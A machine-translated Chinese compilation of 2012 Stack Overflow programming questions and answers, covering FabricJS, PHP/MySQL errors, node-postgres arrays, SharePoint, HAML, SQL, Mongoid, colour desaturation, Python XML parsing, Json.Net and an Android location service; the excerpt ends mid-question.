# StackOverflow 问答 13328000-13328999

# javascript - 将 FabricJS 与 Windows8 应用程序一起使用？

> ID：13328007
> 
> 赞同：0
> 
> 时间：2012-11-11T02:13:12.503
> 
> 标签：javascript, html, winjs, fabricjs

有没有人用 Fabric JS 成功构建了一个 Windows 8 应用程序？

我正在尝试将我制作的网站移植到应用程序中，但不断收到未定义的 fabric.js 文件中的内容错误。

面料甚至可以解决这个问题吗？我的网站无法在 IE 上运行...

让我知道。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-29T02:34:42.940

是的，但是您必须修改 fabric.js 源代码才能使其工作。

众所周知win8是鼠标/触摸都支持的操作系统，所以你必须更改'fabric.isTouchSupported'相关事件，触摸事件和鼠标事件，因为fabric.isTouchSupported在win8上为真，原始源代码不会注册事件鼠标，所以你可以选择/移动/旋转对象，但如果你让它注册事件。

对于 IE，我认为你应该使用 IE8+。检查你的js代码。

您可以从 fabric 源代码站点下载 excanvas.js。 `<!--[if lt IE 9]> <script src="js/excanvas.js"></script> <![endif]-->`

# php - 警告：mysql_fetch_array() 期望参数 1 是资源，布尔值在

> ID：13328009
> 
> 赞同：-2
> 
> 时间：2012-11-11T02:13:50.473
> 
> 标签：php, mysql, sql

> **可能重复：**
> [mysql_fetch_array() 期望参数 1 是资源，选择中给出的布尔值](https://stackoverflow.com/questions/2973202/mysql-fetch-array-expects-parameter-1-to-be-resource-boolean-given-in-select)

你好请帮我解决这个问题

```
<?PHP

if(isset($_GET["id"]))
    {
        $id= $_GET["id"];}

        echo $id;

    $user_name = "root";
    $password = "";
    $database = "test";
    $server = "127.0.0.1";

$db_handle = mysql_connect($server, $user_name, $password);

$db_found = mysql_select_db($database, $db_handle);

if ($db_found) {

$SQL = "SELECT location FROM core_network WHERE sub_cat= (".$id.")";
   $r=mysql_query($SQL);
    $i=0;
    while($data=mysql_fetch_array($r))
    {
        $result[$i]=$data['location'];
        $i++;
    }
    #print_r($result); 
```

回声 $id; 打印正常，我找不到问题，请帮我解决这个问题，非常感谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T02:20:04.293

当您的查询失败时会导致该错误。当`mysql_query()`失败时，它返回一个 boolean `false`，而不是 a `resource`，因此错误：

> mysql_fetch_array() 期望参数 1 是资源，给定的布尔值

要调试，请将您的语句更改为

```
$r = mysql_query($SQL) or die(mysql_error()); 
```

PS-您不应该使用`mysql_*`. 查看 PDO。这是一个帮助您入门的链接：http: [//net.tutsplus.com/tutorials/php/php-database-access-are-you-doing-it-correctly/](http://net.tutsplus.com/tutorials/php/php-database-access-are-you-doing-it-correctly/)

# arrays - 将数组从 node-postgres 传递给 plpgsql 函数

> ID：13328016
> 
> 赞同：2
> 
> 时间：2012-11-11T02:14:58.437
> 
> 标签：arrays, postgresql, parameter-passing, plpgsql, node-postgres

plpgsql 函数：

```
CREATE OR REPLACE FUNCTION testarray (int[]) returns int as $$
  DECLARE
    len int;
  BEGIN
    len := array_upper($1);
  return len;
  END
$$ language plpgsql; 
```

node-postgres 查询 + 测试数组：

```
var ta = [1,2,3,4,5];
client.query('SELECT testarray($1)', [ta], function(err, result) {
  console.log('err: ' + err);
  console.log('result: ' + result);
}); 
```

节点服务器的输出：

> err：错误：数组值必须以“{”开头或维度信息
> 结果：未定义

我还尝试在客户端查询中转换参数，就像`testarray($1::int[])`返回相同的错误一样。

我将函数参数更改为`(anyarray int)`，输出错误更改为：

> 错误：错误：整数的无效输入语法：“1,2,3,4,5”
> 结果：未定义

以及其他几个变体。

我寻找不产生错误并返回 5 的变体。

我阅读了关于[Postgres parse-array 问题](https://github.com/brianc/node-postgres/issues/10)和关于 node-postgres 中参数化数组的这个 stackoverflow 问题：

*   [node-postgres：如何执行“WHERE col IN（<动态值列表>）”查询？](https://stackoverflow.com/questions/10720420/node-postgres-how-to-execute-where-col-in-dynamic-value-list-query)

但答案似乎并不存在。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-11T02:27:13.953

参数必须采用以下形式之一：

```
'{1,2,3,4,5}'         -- array literal
'{1,2,3,4,5}'::int[]  -- array literal with explicit cast
ARRAY[1,2,3,4,5]      -- array constructor 
```

此外，您可以简化功能：

```
CREATE OR REPLACE FUNCTION testarray (int[])
  RETURNS int AS
$func$
BEGIN
  RETURN array_length($1, 1);
END
$func$ LANGUAGE plpgsql IMMUTABLE; 
```

或者一个简单的 SQL 函数：

```
CREATE OR REPLACE FUNCTION testarray2 (int[])
  RETURNS int AS 'SELECT array_length($1, 1)' LANGUAGE sql IMMUTABLE; 
```

或者直接使用[`array_length($1, 1)`](http://www.postgresql.org/docs/current/interactive/functions-array.html#ARRAY-FUNCTIONS-TABLE)。

*   `array_upper()`是*错误*的功能。数组可以有任意下标。**`array_length()`**做你正在寻找的东西。相关问题：

    *   [标准化一维数组的数组下标，使其以 1 开头](https://stackoverflow.com/questions/12011569/normalize-array-subscripts-for-1-dimensional-array-so-they-start-with-1)
*   两者都`array_length()`需要`array_upper()`两个*参数*。第二个是数组维度-`1`在您的情况下。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T07:32:59.640

感谢 PinnyM 和 Erwin 的回复。我查看了选项并重新阅读了相关答案。

Erwin 描述的数组格式在 node-postgres 中的工作方式如下：

```
'select testarray(' + "'{1,2,3,4,5}'" + ')'
'select testarray(' + "'{1,2,3,4,5}'" + '::INT[])'
'select testarray(ARRAY[1,2,3,4,5])' 
```

tl:dr 的[javascript 引用](https://stackoverflow.com/a/244842)

在 node-postgres 中参数化它们：（基于[这个答案](https://stackoverflow.com/a/10829760/1526366)）

```
var ta = [1,2,3,4,5];
var tas = '{' + ta.join() + '}';

...skipped over the pg connect code

client.query("select testarray($1)", [tas] ...
client.query("select testarray($1::int[])", [tas] ...
not sure about the ARRAY constructor. 
```

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2012-11-11T02:26:05.750

根据您发布的答案，这可能对您有用：

```
var ta = [1,2,3,4,5];
var params = [];
for(var i = 1, i <= ta.length; i++) {
    params.push('$'+i);
}
var ta = [1,2,3,4,5];
client.query('SELECT testarray(\'{' + params.join(', ') + '}\')', ta, function(err, result) {
  console.log('err: ' + err);
  console.log('result: ' + result);
}); 
```

# c# - 以编程方式获取 SharePoint 页面正在使用的页面布局

> ID：13328019
> 
> 赞同：1
> 
> 时间：2012-11-11T02:15:31.313
> 
> 标签：c#, sharepoint

想知道是否可以遍历页面库中保存的页面并确定每个页面使用的页面布局？任何 c# 代码示例表示赞赏。

提前谢谢了

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T03:29:51.870

您可以获得对[PublishingWeb](http://msdn.microsoft.com/en-us/library/microsoft.sharepoint.publishing.publishingweb.aspx)对象的引用，并通过具有[Layout 属性](http://msdn.microsoft.com/en-us/library/microsoft.sharepoint.publishing.publishingpage.layout.aspx)的 PublishingPage 对象。

下面我已经对两页示例代码进行了删减，以获得接近您需要的内容。

```
 using (SPWeb web = site.OpenWeb(HttpUtility.UrlDecode(webUri.AbsolutePath)))
            {
                PublishingWeb pWeb = null;

                if (!web.Exists || !PublishingWeb.IsPublishingWeb(web))
                {
                  return;
                }

                pWeb = PublishingWeb.GetPublishingWeb(web);
                PublishingPageCollection publishingPages = publishingWeb.GetPublishingPages();
                foreach (PublishingPage publishingPage in publishingPages)
                {
                   //do something here with publishingPage.Layout
                }               
            } 
```

# windows-8 - 在 Win8 应用程序中使用 fabricJS 库？

> ID：13328022
> 
> 赞同：0
> 
> 时间：2012-11-11T02:15:55.837
> 
> 标签：windows-8, fabricjs

有没有人在开发 Windows 8 应用程序时成功使用过 FabricJS（或其他类似库）？我正在尝试，但不断收到致命错误（主要是结构文件中的变量未定义）。

我正在尝试移植我使用 Fabric JS 创建的网站，但我想知道因为该网站无法在 IE 上运行。那么它甚至可以在 Win8 本机应用程序上运行吗？

# ruby-on-rails-3 - 从haml转换为erb

> ID：13328025
> 
> 赞同：1
> 
> 时间：2012-11-11T02:16:23.647
> 
> 标签：ruby-on-rails-3, haml, erb

我尝试将代码从 haml 转换为 erb，但我被卡住了，不知道为什么。

这是我要转换的原始代码：[https ://github.com/gmarik/simple-backend-example/blob/master/app/views/backend/resource/_index.html.haml](https://github.com/gmarik/simple-backend-example/blob/master/app/views/backend/resource/_index.html.haml)

这就是我现在所拥有的。有人可以看看它并给我一些提示。谢谢。

我最怀疑这条线： `%tr[resource]{odd_or_even}`

我认为它可能是这样的： `<tr> <% @resource{odd_or_even} %>`

RubyMine 在这一行给了我一个错误： `<%= paginate collection %>`

```
 <% content_for(:header) do %>
      <h1><%= resource_class.model_name.human(count: 2) %></h1>

    <ul class="tabs">
       <li class="active"><%= link_to "Index", "#" %></li>
       <li><%= link_to "New", new_resource_path %> </li>
    </ul>
    <table class='zebra-striped'>
      <thead>
        <tr>
          <% attributes.each do |attr| %>
            <th> <%= resource_class.human_attribute_name(attr) %></th>
          <th> &nbsp;</th>
        </tr>
      </thead>
      <tbody>
        <% collection.each do |resource| %>
          <tr> <% @resource{odd_or_even} %>
            <% attributes.each do |attr| %>

            <td> <%= resource.public_send(attr).to_s.truncate(20) %> </td>        
            <td class='row-actions'>
              <%= link_to 'show', resource_path(resource) %>
              |
              <%= link_to 'edit', edit_resource_path(resource) %>
              |
              <%= link_to 'destroy', resource_path(resource), method: :delete, confirm: "Are you sure?" %>
            </td>
        <% end %> 
      </tbody> 
    </table>  
    <%= paginate collection %> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T02:25:33.907

在这里查看文档：http: [//haml.info/docs/yardoc/file.REFERENCE.html#object_reference_](http://haml.info/docs/yardoc/file.REFERENCE.html#object_reference_)

我会说它是：

```
<tr id="<%= "#{resource.class.name.underscore}_#{resource.to_key}" %>" class="<%= resource.class.name.underscore %>"> 
```

这是要翻译的`%tr[resource]`。

现在，`{odd_or_even}`将只转换帮助程序的结果哈希`odd_or_even`以将它们映射为`tr`.

If we take a look at the definition of the method here : [https://github.com/gmarik/simple-backend-example/blob/master/app/helpers/backend/application_helper.rb](https://github.com/gmarik/simple-backend-example/blob/master/app/helpers/backend/application_helper.rb)

We see it's just a call to [`cycle`](http://api.rubyonrails.org/classes/ActionView/Helpers/TextHelper.html#method-i-cycle) in order to set an extra class. Therefore we end up with:

```
<tr id="<%= "#{resource.class.name.underscore}_#{resource.to_key}" %>" class="<%= "#{resource.class.name.underscore} #{cycle("odd", "even", name: "rows")}" %>"> 
```

Now, all of this won't fix the problem of `paginate`. Add the error message if you're still stuck on this.

# sql - 如何查询不在一组 id 中的项目 - 清理数据

> ID：13328026
> 
> 赞同：-5
> 
> 时间：2012-11-11T02:16:27.467
> 
> 标签：sql

例如，我有以下外键 ID：

```
 10437 
 10476 
 13212 
 13215 
```

我想找到其中一个已从主表中删除的，即这组中缺少哪些？我该怎么做？我假设一个`in`声明的一些变体。

提前谢谢

**编辑#1**

所以为了改写上面的内容，我想要一些类似的东西：

```
TABLE
id 
10437 
13215

select something from items where id not in (10437, 10476, 13212, 13215)

would return:
10476 
13212 
```

这些数字大约有数百个项目，因此只想删除孤立的记录，这不是传统的外键关系，因此外部连接不起作用。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-11T02:18:03.300

~~您可以`NOT IN`像这样使用谓词：~~

 ~~```
SELECT *
FROM YourTableName
WHERE ReferenceId NOT IN(10437, 10476, 13212, 13215); 
```

## [SQL 小提琴演示](http://sqlfiddle.com/#!2/eecf3/1)~~ 

**更新：**如果您想要存在的 Id，请使用`IN`谓词：

```
SELECT *
FROM YourTableName 
WHERE ReferenceId IN (10437, 10476, 13212, 13215); 
```

## [SQL 小提琴演示](http://sqlfiddle.com/#!2/eecf3/11)

 ~~**更新 2：**要清除此问题，您需要表中不存在的 id 列表中的 id 列表。想法相同，但方式不同

```
SELECT FROM (list of ids) WHERE id NOT IN (SELECT referenceid from Table); 
```

不是这个：

```
SELECT FROM Table WHERE id not in (list of ids ) will give you the other list; 
```

因为这将给出 id 列表中不存在的表中的 id 列表。

你可以这样做：

```
SELECT *
FROM 
( 
    SELECT 10437 id
    UNION ALL
    SELECT 10476
    UNION ALL
    SELECT 13212
    UNION ALL
    SELECT 13215
) t1
WHERE id NOT IN (SELECT referenceid FROM YourTableName); 
```

或者`RIGHT JOIN`像这样：

```
SELECT t2.Id
FROM YourTableName t1 
RIGHT JOIN
( SELECT 10437 id
  UNION ALL
  SELECT 10476
  UNION ALL
  SELECT 13212
  UNION ALL
  SELECT 13215
 ) t2 ON t1.ReferenceID = t2.id
WHERE t1.referenceid IS NULL; 
```

## [SQL 小提琴演示](http://sqlfiddle.com/#!2/f2e25/10)

两者都应该返回：

```
10476 
13212 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-11T02:19:44.833

```
select * from your-table where id not in (your-list-of-ids) 
```

根据您使用的数据库，`your-list-of-ids`可以是嵌套查询，例如：

`select id from your-other-table`

**更清楚**

`select id from your-primary-table`为您提供主表中的所有 ID。

```
select * from your-secondary-table where foreign_key_id not in (select id from your-primary-table) 
```

为您提供辅助表中的行，其外键在主表中不再存在。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-11T02:41:04.323

```
select t1.foreign_key_field from table_with_foreign_key as t1 
left join table_with_primary_key as t2 on t2.id = t1.foreign_key_field 
where  t2.id is null 
```

语法取决于sql方言~~

# ruby - 在 Mongoid 中插入

> ID：13328028
> 
> 赞同：6
> 
> 时间：2012-11-11T02:17:01.873
> 
> 标签：ruby, mongodb, mongoid, upsert

在 Mongoid 中是否有一种内置的方式来制作 upsert（如果不存在则插入）？或者我应该先检查一个项目是否存在并且只有在插入/更新之后才存在？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-11T02:24:45.570

Mongoid 中已经有一个内置的 upsert 方法

> 对文档执行 MongoDB upsert。如果文档存在于数据库中，它将被内存中文档的当前属性覆盖。如果该文档在数据库中不存在，则将其插入。请注意，这只运行 {before|after|around}_upsert 回调。

取自[https://docs.mongodb.com/mongoid/current/tutorials/mongoid-persistence/](https://docs.mongodb.com/mongoid/current/tutorials/mongoid-persistence/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2022-01-06T14:36:05.340

这是一个例子

```
person = Person.new(
   first_name: "Heinrich",
   last_name: "Heine"
)
person.upsert 
```

来源： [https ://mongoid.github.io/old/en/mongoid/docs/persistence.html](https://mongoid.github.io/old/en/mongoid/docs/persistence.html)

# c# - 如何去饱和颜色？

> ID：13328029
> 
> 赞同：11
> 
> 时间：2012-11-11T02:17:24.240
> 
> 标签：c#, .net, vb.net, colors

我可能没有使用正确的颜色术语，但我希望基本上能够缩放类似于所附图片的颜色。我一直在寻找饱和度来做到这一点，因为看起来右边的版本只是左边的饱和度较低的版本。

![在此处输入图像描述](../Images/43a79248897bfee04c064c9fcb7a62bc.png)

我正在尝试这个（我发现）但它看起来根本不正确：

```
Public Shared Function GetDesaturatedColor(color As Color) As Color
    Const kValue As Double = 0.01R

    Dim greyLevel = (color.R * 0.299R) + _
                    (color.G * 0.587R) + _
                    (color.B * 0.144R)

    Dim r = greyLevel * kValue + (color.R) * (1 - kValue)
    Dim g = greyLevel * kValue + (color.G) * (1 - kValue)
    Dim b = greyLevel * kValue + (color.B) * (1 - kValue)

    ' ColorUtils.ToByte converts the double value 
    ' to a byte safely
    Return color.FromArgb(255, _
                          ColorUtils.ToByte(r), _
                          ColorUtils.ToByte(g), _
                          ColorUtils.ToByte(b))
End Function 
```

有谁知道一些可以做到这一点的算法？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-12-28T23:52:27.723

对于那些想要避免将所有内容都转换为 HSL/HSV 并返回的人来说，这工作得相当好（如果不正确，取决于人们认为“正确”的去饱和图像是什么）：

```
f = 0.2; // desaturate by 20%
L = 0.3*r + 0.6*g + 0.1*b;
new_r = r + f * (L - r);
new_g = g + f * (L - g);
new_b = b + f * (L - b); 
```

这是使用绿色、红色和蓝色分别对应于图像降低比例的[亮度](https://en.wikipedia.org/wiki/Grayscale#Luma_coding_in_video_systems)的共同假设将 r、g、b 转换为灰度。所以 L 是灰度图像，然后 f 只是在输入 RGB 图像和该灰度图像之间进行线性插值。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-11T02:32:12.163

正如@Brad 在您帖子的评论中提到的，您的第一步是将颜色从 RGB 转换为[HSL 或 HSV](http://en.wikipedia.org/wiki/HSL_and_HSV)。从那里开始，降低饱和度是微不足道的 - 只需将饱和度减去或除以一个值即可降低它。

之后，将您的 HSL/HSV 颜色转换回 RGB，即可使用。

[如何将 RGB 颜色更改为 HSV？](https://stackoverflow.com/questions/359612/how-to-change-rgb-color-to-hsv)有一个很好的例子来说明如何做到这一点，就像[在 .net 中操纵颜色](http://www.codeproject.com/Articles/19045/Manipulating-colors-in-NET-Part-1)一样。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-11T03:21:19.770

实验表明，仅仅降低饱和度并不足以得到图中所示的结果。我在下面显示的代码中使用了 OP 问题中的颜色。如果你只是降低饱和度，你会得到：

![在此处输入图像描述](../Images/57a6b0ffe9ff553110f483e3844e0e3c.png)

如果还降低新颜色的 alpha/opacity，则可以获得更好的结果：

![在此处输入图像描述](../Images/fa0b1833cc024f6d342589011937754a.png)

我假设如果你使用参数，你应该能够得到一个完美的匹配。尝试更改`alpha`（`reducedSaturation2`当前 =40）和`GetSaturation`除法器（当前 =1.3）

这是我的代码示例：

```
Public Function HSVToColor(ByVal H As Double, ByVal S As Double, ByVal V As Double) As Color
  Dim Hi As Integer = (H / 60) Mod 6
  Dim f As Double = H / 60 Mod 1
  Dim p As Integer = V * (1 - S) * 255
  Dim q As Integer = V * (1 - f * S) * 255
  Dim t As Integer = V * (1 - (1 - f) * S) * 255
  Select Case Hi
    Case 0 : Return Color.FromArgb(V * 255, t, p)
    Case 1 : Return Color.FromArgb(q, V * 255, p)
    Case 2 : Return Color.FromArgb(p, V * 255, t)
    Case 3 : Return Color.FromArgb(p, V * 255, q)
    Case 4 : Return Color.FromArgb(t, p, V * 255)
    Case 5 : Return Color.FromArgb(V * 255, q, p)
  End Select
End Function

Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
  Dim normalSaturation As Color = Color.FromArgb(255, 216, 53, 45)
  Me.CreateGraphics.FillRectangle(New SolidBrush(normalSaturation), 100, 0, 100, 100)
  Dim reducedSaturation As Color = HSVToColor(normalSaturation.GetHue, normalSaturation.GetSaturation / 1.3, normalSaturation.GetBrightness)
  Dim reducedSaturation2 As Color = Color.FromArgb(40, reducedSaturation)
  Me.CreateGraphics.FillRectangle(New SolidBrush(reducedSaturation2), 0, 0, 100, 100)
End Sub 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2020-02-11T20:17:13.290

`Color`这是我在 C#中更改给定饱和度的公式。结果等同于应用 CSS-effect `filter: saturate(...)`，因为这是 W3C 规范使用的公式。

```
private static Color Saturate(Color c, double saturation) {
   // Values from: https://www.w3.org/TR/filter-effects-1/#feColorMatrixElement , type="saturate"
   var s = saturation;
   Func<double, int> clamp = i => Math.Min(255, Math.Max(0, Convert.ToInt32(i)));
   return Color.FromArgb(255,
      clamp((0.213 + 0.787 * s) * c.R + (0.715 - 0.715 * s) * c.G + (0.072 - 0.072 * s) * c.B),
      clamp((0.213 - 0.213 * s) * c.R + (0.715 + 0.285 * s) * c.G + (0.072 - 0.072 * s) * c.B),
      clamp((0.213 - 0.213 * s) * c.R + (0.715 - 0.715 * s) * c.G + (0.072 + 0.928 * s) * c.B));
} 
```

# python - 在python中创建读取表单xml的wiki链接

> ID：13328033
> 
> 赞同：0
> 
> 时间：2012-11-11T02:18:07.870
> 
> 标签：python, python-2.7

我正在尝试读取标签中的所有链接，然后尝试从中创建 wiki 链接...基本上我想从 xml 文件中读取每个链接，然后使用最后一个单词创建 wiki 链接（请参阅下面的内容我的意思是链接的最后一个字）...由于某种原因遇到以下错误，我缺少什么，请建议

```
http://wiki.build.com/ca_builds/CIT (last word is CIT)
http://wiki.build.com/ca_builds/1.2_Archive(last word is 1.2_Archive) 
```

输入 XML：-

```
<returnLink>
    http://wiki.build.com/ca_builds/CIT
    http://wiki.build.com/ca_builds/1.2_Archive
</returnLink> 
```

蟒蛇代码

```
 def getReturnLink(xml):
"""Collects the link to return to the PL home page from the config file."""
if xml.find('<returnLink>') == -1:
    return None
else:
    linkStart=xml.find('<returnLink>')
    linkEnd=xml.find('</returnLink>')
    link=xml[linkStart+12:linkEnd].strip()
    link = link.split('\n')
    #if link.find('.com') == -1:
        #return None
    for line in link:
        line = line.strip()
        print "LINE"
        print line
        lastword = line.rfind('/') + 1
        line = '['+link+' lastword]<br>'
        linklis.append(line)
    return linklis 
```

输出：-

```
 line = '['+link+' lastword]<br>'
 TypeError: cannot concatenate 'str' and 'list' objects 
```

预期输出：-

```
CIT  (this will point to http://wiki.build.com/ca_builds/CIT
1.2_Archive (this will point to http://wiki.build.com/ca_builds/1.2_Archive 1.2_Archive) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T11:39:06.243

Python 标准库有 xml 解析器。您还可以`<returnLink>`在一个 url 中支持多个元素和 Unicode 单词：

```
import posixpath
import urllib
import urlparse
from xml.etree import cElementTree as etree

def get_word(url):
    basename = posixpath.basename(urlparse.urlsplit(url).path)
    return urllib.unquote(basename).decode("utf-8")

urls = (url.strip()
        for links in etree.parse(input_filename_or_file).iter('returnLink')
        for url in links.text.splitlines())
wikilinks = [u"[{} {}]".format(url, get_word(url))
             for url in urls if url]
print(wikilinks) 
```

注意：在内部使用 Unicode。仅将文本转换为字节以与外部世界通信，例如，在写入文件时。

[例子](http://ideone.com/jODrrr)

```
[http://wiki.build.com/ca_builds/CIT#some-fragment CIT]
[http://wiki.build.com/ca_builds/Unicode%20%28%E2%99%A5%29 Unicode (♥)] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T02:57:04.970

我在理解您的问题时遇到了一些困难，但您似乎只想在链接中的最后一个“/”字符之后返回字符串？您可以使用反向查找来执行此操作。

```
return link[link.rfind('/') + 1:] 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-11T03:59:51.527

无需手动解析 XML，请使用如下库[`lxml`](http://lxml.de/)：

```
>>> s = """<returnLink>
...     http://wiki.build.com/ca_builds/CIT
...     http://wiki.build.com/ca_builds/1.2_Archive
... </returnLink>"""
>>> from lxml import etree
>>> xml_tree = etree.fromstring(s)
>>> links = xml_tree.text.split()
>>> for i in links:
...    print '['+i+']'+i[i.rfind('/')+1:]
...
[http://wiki.build.com/ca_builds/CIT]CIT
[http://wiki.build.com/ca_builds/1.2_Archive]1.2_Archive 
```

我不确定您所说的 wikilinks 是什么意思，但以上内容应该让您了解如何解析字符串。

# c# - 我可以在单个序列化程序的上下文中覆盖 Json.Net 成员名称映射吗？

> ID：13328040
> 
> 赞同：3
> 
> 时间：2012-11-11T02:20:16.183
> 
> 标签：c#, .net, couchdb, json.net

我正在尝试将文档写入 .NET 中的 CouchDB，但我不想用 标记我的所有`Id`属性`[JsonProperty(MemberName = "_id")]`，因为我需要正常序列化它们（成员名称为`Id`）以通过我自己的 HTTP 将它们发送出去API。

基本上，我想要这个：

```
var serializer = new JsonSerializer();
/* some magic happens */
serializer.Serialize(textWriter, new Thing { Id = "foo", Value = "bar" }); 
```

要导致这个：

```
{_id:"Foo",Value:"Bar"} 
```

但是没有魔法joojoo，应该还是这样的：

```
{Id:"Foo",Value:"Bar"} 
```

我假设这不应该太难，但我对 Json.Net 内部的了解还不够好，无法做到 Just Do It™。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-11T03:06:07.117

首先创建一个ContractResolver：

```
public class IdContractResolver : DefaultContractResolver
{
    protected override string ResolvePropertyName(string propertyName)
    {
        if (propertyName == "Id") return "_id";
        return base.ResolvePropertyName(propertyName);
    }
} 
```

然后通过附加它来添加魔法：

```
var serializer = new JsonSerializer();
serializer.ContractResolver = new IdContractResolver();
serializer.Serialize(textWriter, new Thing { Id = "foo", Value = "bar" }); 
```

你得到：

```
{_id:"Foo",Value:"Bar"} 
```

# android - 将当前位置与我的数据库数据进行比较

> ID：13328041
> 
> 赞同：0
> 
> 时间：2012-11-11T02:20:30.983
> 
> 标签：android, database, service, location

我需要将我当前的地理位置（纬度和经度）与我存储在数据库中的地理位置进行比较，如果两者之间的距离小于 2 公里，那么我想开始一些活动..但它不起作用..我是认为我的服务类中存在一些问题，因为我在后台服务中执行所有这些操作，该服务在我开始活动时开始......请告诉我做错了什么这是我的代码

```
package com.example.alert;

import java.util.ArrayList;
import java.util.List;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaPlayer;
import android.os.Bundle;
import android.os.IBinder;
import android.widget.Toast;

public class service extends Service{
LocationManager lm;
DatabaseHelper db=new DatabaseHelper(this);
List<Double> arlist=new ArrayList<Double>();
List<Double> arrylist=new ArrayList<Double>();

@Override
public IBinder onBind(Intent arg0) {
    // TODO Auto-generated method stub
    return null;
}

public void onCreate() {
    LocationManager lm=(LocationManager)getSystemService(Context.LOCATION_SERVICE);

    LocationListener ll=new MyLocationListener();
    //lm.requestLocationUpdates( LocationManager.GPS_PROVIDER, 5*60*10000, 0, ll);
    lm.requestLocationUpdates( LocationManager.GPS_PROVIDER, 0, 0, ll);

//      Toast.makeText(this, "Background Service Created", Toast.LENGTH_LONG).show();

}

public void onDestroy() {
    Toast.makeText(this, "My Service Stopped", Toast.LENGTH_LONG).show();

}

public void onStart(Intent intent, int startid) {

    Toast.makeText(this, "Finding your Current Location.....", Toast.LENGTH_LONG).show();
//  Intent myIntent=new Intent(service.this,CurrentLocation.class);
    }

/* Class My Location Listener */
public class MyLocationListener implements LocationListener
{

    public void onLocationChanged(Location loc)
    {
        if(loc!=null)
        {

            String Text = "My current location is: " +"Latitud = " + loc.getLatitude() +"Longitud = " + loc.getLongitude();
            SQLiteDatabase y = db.getWritableDatabase();

            Toast.makeText( getApplicationContext(),Text,Toast.LENGTH_SHORT).show();
        //  String t=loc.getLatitude().toString();
            Cursor cr=null;
            Cursor cur=null;
            cur=y.rawQuery("SELECT longitude FROM"+ "data",null);
            cur.moveToFirst();
            cr=y.rawQuery("SELECT latitude FROM"+ "data",null);
            cr.moveToFirst();
            while(!cr.isAfterLast()) {

                arlist.add(cr.getDouble(cr.getColumnIndex("latitude")));
                cr.moveToNext();
                }
            while(!cur.isAfterLast()) {

                arrylist.add(cr.getDouble(cr.getColumnIndex("ongitude")));
                cur.moveToNext();
                }
            for(int i=0;i<arlist.size();i++){
                if(calcDistance(loc.getLatitude(),loc.getLongitude(),arlist.get(i),arrylist.get(i))<5){
                    Intent myIntent=new Intent(service.this,SilVib.class);
                    startActivity(myIntent);
                }
            }

            /*  cr.moveToFirst();
            while(!cr.isAfterLast()) {
                 al.add(cr.getString(cr.getColumnIndex(dbAdapter.KEY_NAME))); //add the item
                 cr.moveToNext();
            }*/
        //  lm.addProximityAlert(loc.getLatitude(), loc.getLongitude(), 10009,, intent)

            //for loop, alerters retrieving one by one
//      x= calcDistance(loc.getLatitude(),loc.getLongitude(),z,y);
    //      if(x<1){
        //        Intent myIntent = new Intent(ViewAlerters.this,CallMode.class);
          //        startActivity(myIntent);
            }

        }

    public void onProviderDisabled(String provider) {
        // TODO Auto-generated method stub
        Toast.makeText( getApplicationContext(),"Gps Disabled - @From :Alert Me",Toast.LENGTH_SHORT ).show();

    }

    public void onProviderEnabled(String provider) {
        // TODO Auto-generated method stub
        Toast.makeText( getApplicationContext(),"Gps Enabled - @From :Alert Me",Toast.LENGTH_SHORT).show();

    }

    public void onStatusChanged(String provider, int status, Bundle extras) {
        // TODO Auto-generated method stub

    }
    }

public double calcDistance(double latA, double longA, double latB, double longB) {

    double theDistance = (Math.sin(Math.toRadians(latA)) *  Math.sin(Math.toRadians(latB)) + Math.cos(Math.toRadians(latA)) * Math.cos(Math.toRadians(latB)) * Math.cos(Math.toRadians(longA - longB)));
    return new Double((Math.toDegrees(Math.acos(theDistance))) * 69.09*1.6093);
} 
```

}

这是我更新的代码...每当我尝试使用意图启动此服务时，它都会强制关闭

```
package com.example.alert;

import java.util.ArrayList;
import java.util.List;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaPlayer;
import android.os.Bundle;
import android.os.IBinder;
import android.widget.Toast;

public class service extends Service{
LocationManager lm;
DatabaseHelper db=new DatabaseHelper(this);
List<Double> arlist=new ArrayList<Double>();
List<Double> arrylist=new ArrayList<Double>();
SQLiteDatabase y = db.getWritableDatabase();

@Override
public IBinder onBind(Intent arg0) {
    // TODO Auto-generated method stub
    return null;
}

public void onCreate() {
    LocationManager lm=(LocationManager)getSystemService(Context.LOCATION_SERVICE);

    LocationListener ll=new MyLocationListener();
    //lm.requestLocationUpdates( LocationManager.GPS_PROVIDER, 5*60*10000, 0, ll);
    lm.requestLocationUpdates( LocationManager.GPS_PROVIDER, 0, 0, ll);

}

public void onDestroy() {
    Toast.makeText(this, "My Service Stopped", Toast.LENGTH_LONG).show();

}

public void onStart(Intent intent, int startid) {

    Toast.makeText(this, "Finding your Current Location.....", Toast.LENGTH_LONG).show();
//  Intent myIntent=new Intent(service.this,CurrentLocation.class);
    }

/* Class My Location Listener */
public class MyLocationListener implements LocationListener
{

    public void onLocationChanged(Location loc)
    {
        if(loc!=null)
        {

